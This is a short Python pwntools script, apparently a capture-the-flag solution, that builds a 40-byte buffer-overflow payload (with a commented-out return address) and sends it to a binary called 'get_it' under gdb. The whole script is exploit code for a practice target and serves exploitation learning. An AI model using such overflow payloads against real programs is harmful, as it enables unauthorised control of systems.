from pwn import *
payload=b"A"*40
#payload+=p32(0x004005b6)
with open("payload", "wb") as fp:
    fp.write(payload)
t = pwnlib.gdb.debug('./get_it')
t.sendline(payload)
t.interactive()
